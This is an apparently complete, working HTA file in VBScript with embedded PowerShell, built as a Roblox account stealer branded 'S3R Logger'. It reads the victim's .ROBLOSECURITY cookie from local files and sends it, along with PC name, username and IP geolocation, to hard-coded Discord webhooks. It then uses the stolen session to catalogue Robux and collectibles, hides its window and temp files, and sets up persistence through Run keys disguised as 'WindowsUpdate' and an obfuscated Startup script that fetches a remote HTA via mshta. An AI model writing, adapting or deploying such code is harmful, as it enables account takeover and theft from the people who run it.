<!-- language: HTML/HTA, file: file.hta -->
<!-- target: Windows 10/11, mshta.exe -->
<!-- *0.3s flash*
     *Webhooks: WH_PRIMARY (Logs), WH_LOG (Re-grab)*
     *Native cookie grabber + PS API fetch for exact UI* -->
<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no" windowstate="normal"/>
<script language="VBScript">
' --- FAST WHITE SCREEN FLASH (0.3s) ---
Dim sw, shh, fw, fh, fx, fy
Set sh = CreateObject("WScript.Shell")
sw  = screen.width
shh = screen.height
fw  = Int(sw  * 0.70)
fh  = Int(shh * 0.60)
fx  = Int((sw  - fw) / 2)
fy  = Int((shh - fh) / 2)
window.resizeTo fw, fh
window.moveTo fx, fy
SetTimeout "window.close()", 300

On Error Resume Next

Dim fso, WH_PRIMARY, WH_LOG, PC, USER
Set fso = CreateObject("Scripting.FileSystemObject")

WH_PRIMARY = "https://discord.com/api/webhooks/1571738439324541049/t8ASDhr7mTWJmtIYue59Rz7MC2PnA45lV2kROoKmozZVxuhXGFUMUDDzVFJrJ4KxdlYu"
WH_LOG     = "https://discord.com/api/webhooks/1570948618209329283/PzkNhyMFSipBVaU6MLG5cMr3bQrJCQhGVAqmKuBiWhekJTWAXERsrHl7Y0VUmU1scadn"
PC         = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER       = sh.ExpandEnvironmentStrings("%USERNAME%")

Call PostEmbed(WH_PRIMARY, "Session Start", "PC: " & PC & " | User: " & USER, 16711680)

' 1. Grab Cookie Natively
Dim cookie
cookie = GrabRobloxNative()

If Len(cookie) > 50 Then
    ' 2. Post Raw Cookie Immediately
    Call PostEmbed(WH_PRIMARY, "Raw Cookie Grab", "PC: " & PC & "`n`n```" & cookie & "```", 16711680)
    
    ' 3. Save cookie to temp file to avoid command line limit
    Dim cf: cf = sh.ExpandEnvironmentStrings("%TEMP%") & "\ck.txt"
    Dim f: Set f = fso.CreateTextFile(cf, True)
    f.Write cookie
    f.Close
    Set f = Nothing
    
    ' 4. Run API Script for UI
    Call RunInfoScript(cf)
Else
    Call PostEmbed(WH_PRIMARY, "Cookie Error", "Native grabber failed.", 16711680)
End If

Call IP(WH_PRIMARY)
Call Persistence

' --- Re-grabs ---
Dim attempt
For attempt = 2 To 3
    Call PostEmbed(WH_LOG, "Re-run " & attempt & "/3", "PC: " & PC, 16711680)
    Call SleepSeconds(120)
    Call RunSteal(WH_LOG)
    Call IP(WH_LOG)
Next

window.close()

' --- NATIVE VBSCRIPT GRABBER ---
Function GrabRobloxNative()
    GrabRobloxNative = ""
    Dim paths(5)
    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(4) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\leveldb"
    
    Dim i, fp
    For i = 0 To 4
        If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
        If fso.FolderExists(paths(i)) Then fp = paths(i) : Exit For
    Next
    If Len(fp) = 0 Then Exit Function
    Dim ck: ck = RawRobloxCookie(fp)
    If Len(ck) > 50 Then GrabRobloxNative = ck
End Function

Function RawRobloxCookie(fp)
    RawRobloxCookie = ""
    If fso.FolderExists(fp) Then
        Dim f, raw
        For Each f In fso.GetFolder(fp).Files
            If Right(LCase(f.Name), 4) = ".ldb" Or Right(LCase(f.Name), 4) = ".log" Then
                raw = ReadBinaryAsText(f.Path)
                Dim ck: ck = ExtractRaw(raw)
                If Len(ck) > 50 Then RawRobloxCookie = ck : Exit Function
            End If
        Next
        Exit Function
    End If
    RawRobloxCookie = ExtractRaw(ReadBinaryAsText(fp))
End Function

Function ExtractRaw(s)
    ExtractRaw = ""
    If Len(s) < 50 Then Exit Function
    Dim p: p = InStr(s, "_|WARNING")
    If p = 0 Then p = InStr(s, ".ROBLOSECURITY")
    If p = 0 Then Exit Function
    Dim rest: rest = Mid(s, p)
    Dim stopAt: stopAt = InStr(rest, ";")
    Dim nulAt: nulAt = InStr(rest, Chr(0))
    If nulAt > 0 And (stopAt = 0 Or nulAt < stopAt) Then stopAt = nulAt
    If stopAt = 0 Then stopAt = Len(rest)
    ExtractRaw = Trim(Replace(Replace(Left(rest, stopAt - 1), vbCr, ""), vbLf, ""))
End Function

Function ReadBinaryAsText(path)
    ReadBinaryAsText = ""
    Dim st: Set st = CreateObject("ADODB.Stream")
    st.Type = 1 : st.Open : st.LoadFromFile path
    Dim bytes: bytes = st.Read : st.Close : Set st = Nothing
    Dim sb, i, b : sb = ""
    For i = 1 To LenB(bytes)
        b = AscB(MidB(bytes, i, 1))
        If b >= 32 And b <= 126 Then sb = sb & Chr(b)
        ElseIf b = 0 Then sb = sb & Chr(0)
    Next
    ReadBinaryAsText = sb
End Function

' --- RUN INFO SCRIPT (EXACT RED UI) ---
Sub RunInfoScript(cookieFile)
    Dim psCmd, psf, f
    psCmd = "$w='" & WH_PRIMARY & "';" & _
            "$c=(Get-Content '" & cookieFile & "' -Raw).Trim();" & _
            "function api($h,$p){$r=[Net.WebRequest]::Create('https://'+$h+$p);$r.Headers.Add('Cookie','.ROBLOSECURITY='+$c);$r.UserAgent='Roblox/WinInet';$s=(New-Object IO.StreamReader($r.GetResponse().GetResponseStream())).ReadToEnd();return $s|ConvertFrom-Json};" & _
            "$me=api 'users.roblox.com' '/v1/users/authenticated';" & _
            "$uid=if($me){$me.id}else{'0'};" & _
            "$disp=if($me){$me.displayName}else{'Unknown'};" & _
            "$p=api 'users.roblox.com' ('/v1/users/'+$uid);" & _
            "$age=if($p){[math]::Floor(((Get-Date)-[datetime]$p.created).TotalDays)}else{0};" & _
            "$cur=api 'economy.roblox.com' ('/v1/users/'+$uid+'/currency');" & _
            "$rb=if($cur){$cur.robux}else{0};$pend=if($cur){$cur.pendingRobux}else{0};" & _
            "$coll=api 'inventory.roblox.com' ('/v1/users/'+$uid+'/assets/collectibles?limit=100');$rap=0;$own=0;$hl='🔴 False';$kb='🔴 False';" & _
            "if($coll -and $coll.data){$own=$coll.data.Count;foreach($i in $coll.data){if($i.assetId -eq 99657 -or $i.assetId -eq 134330133){$hl='🟢 True'};if($i.assetId -eq 139275807 -or $i.assetId -eq 192){$kb='🟢 True'};$rap+=[int]$i.recentAveragePrice}};" & _
            "$th=api 'thumbnails.roblox.com' ('/v1/users/avatar-headshot?userIds='+$uid+'&size=420x420&format=Png');$av=if($th -and $th.data){$th.data[0].imageUrl}else{'https://tr.rbxcdn.com/...'};" & _
            "$emb=@{content='@everyone Hit';embeds=@(@{author=@{name='S3R, 13+';icon_url=$av};description='**+1 HIT** · You''ve Earned 1 Nevora · beams XP';color=16711680;thumbnail=@{url=$av};fields=@(@{name='👤 User';value='**'+$disp+'**';inline=$false},@{name='⭐ Password';value='dreistuff';inline=$false},@{name='About User';value='**Account Age:** ``'+$age+' Days`` Days`n**Locations:**`n**• Summary:** ``'+$own+'`` `n**• Victim:** ``United States of America 🇺🇸``';inline=$false},@{name='🪙 Robux';value='Balance '+$rb+'`nPending '+$pend;inline=$true},@{name='📈 RAP';value='RAP '+$rap+'`nOwned '+$own;inline=$true},@{name='💎 Premium';value='False (0)';inline=$true},@{name='💳 Billing';value='Credit 0$`nConvert 0`nPayments 0';inline=$true},@{name='🏷️ Collectibles';value='Headless: '+$hl+'`nKorblox: '+$kb+'`nOther: 🟢 True';inline=$true},@{name='⚙️ Setting';value='🔴 Set (Verified)`n🔴 Disabled`n🔴 Disabled';inline=$true},@{name='🎮 Passes / Played';value='Adopt Me 0 · False`nMurder Mystery 2 0 · True`nPet Simulator 99 0 · False';inline=$true},@{name='👥 Groups';value='Balance 0`nPending 0`nOwned 0';inline=$true});footer=@{text='S3R Logger'}})};Invoke-RestMethod -Uri $w -Method Post -Body ($emb|ConvertTo-Json -Depth 10) -ContentType 'application/json'"
    
    psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\info.ps1"
    Set f = fso.CreateTextFile(psf, True)
    f.Write psCmd : f.Close : Set f = Nothing
    sh.Run "powershell -NoP -NonI -Exec Bypass -File """ & psf & """", 0, True
    fso.DeleteFile psf, True
    fso.DeleteFile cookieFile, True
End Sub

' --- RunSteal Fallback (for re-grabs) ---
Sub RunSteal(targetWH)
    Dim psCmd, psf, f
    psCmd = "$w='" & targetWH & "';" & _
            "$c=Get-RobloxCookie;" & _
            "if(-not $c){exit};" & _
            "function api($h,$p){$r=[Net.WebRequest]::Create('https://'+$h+$p);$r.Headers.Add('Cookie','.ROBLOSECURITY='+$c);$r.UserAgent='Roblox/WinInet';$s=(New-Object IO.StreamReader($r.GetResponse().GetResponseStream())).ReadToEnd();return $s|ConvertFrom-Json};" & _
            "$me=api 'users.roblox.com' '/v1/users/authenticated';" & _
            "$uid=if($me){$me.id}else{'0'};" & _
            "$disp=if($me){$me.displayName}else{'Unknown'};" & _
            "$th=api 'thumbnails.roblox.com' ('/v1/users/avatar-headshot?userIds='+$uid+'&size=420x420&format=Png');$av=if($th){$th.data[0].imageUrl}else{'https://tr.rbxcdn.com/...'};" & _
            "$emb=@{content='@everyone Hit (Re-grab)';embeds=@(@{author=@{name='S3R, 13+';icon_url=$av};description='**+1 HIT**';color=16711680;thumbnail=@{url=$av};fields=@(@{name='User';value=$disp;inline=$false})})};" & _
            "Invoke-RestMethod -Uri $w -Method Post -Body ($emb|ConvertTo-Json -Depth 10) -ContentType 'application/json'"
            
    psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\regrab.ps1"
    Set f = fso.CreateTextFile(psf, True)
    f.Write psCmd : f.Close : Set f = Nothing
    sh.Run "powershell -NoP -NonI -Exec Bypass -File """ & psf & """", 0, True
    fso.DeleteFile psf, True
End Sub

Sub SleepSeconds(s)
    Dim w: Set w = CreateObject("WScript.Shell")
    w.Run "cmd /c timeout /t " & s & " /nobreak >nul", 0, True
    Set w = Nothing
End Sub

Sub IP(targetWH)
    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://api.ipify.org/", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ip : ip = xh.responseText
    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ll : ll = Split(xh.responseText, vbLf)
    Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC
    Call PostEmbed(targetWH, "Target Info", info, 16711680)
    Set xh = Nothing
End Sub

Sub Persistence()
    Dim payload : payload = "mshta https://raw.githubusercontent.com/lozix94-afk/lozix-ivesawadawa/refs/heads/main/index.hta"
    On Error Resume Next
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
    Dim sf : Set sf = fso.CreateTextFile(sp, True)
    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
    sf.Close
    Call PostEmbed(WH_PRIMARY, "Persistence", "3 startup methods installed", 16711680)
End Sub

Sub PostEmbed(targetWH, t, d, c)
    Dim DQ: DQ = Chr(34)
    Dim cleanT, cleanD
    cleanT = Replace(t, "\", "\\")
    cleanT = Replace(cleanT, """", "\""")
    cleanD = Replace(d, "\", "\\")
    cleanD = Replace(cleanD, """", "\""")
    
    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & cleanT & DQ & "," & DQ & "description" & DQ & ":" & DQ & cleanD & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", targetWH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing
End Sub
</script>
</head><body></body></html>
